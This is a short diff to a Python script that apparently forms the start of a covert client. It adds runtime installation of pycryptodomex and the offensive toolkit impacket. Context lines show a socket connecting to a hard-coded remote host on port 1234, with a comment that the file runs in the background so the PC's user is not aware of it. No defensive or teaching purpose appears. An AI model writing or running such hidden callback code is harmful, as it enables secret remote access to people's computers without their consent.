@@ -1,9 +1,15 @@
 import socket
 import os
 import subprocess
+import sys
 from subprocess import call
 
 FORMAT = "utf-8"
+
+# installing the required packages
+subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pycryptodomex'])
+subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'impacket'])
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("10.0.26.244", 1234))
 # this file should be run in the background so the person using the pc is not aware of the process running
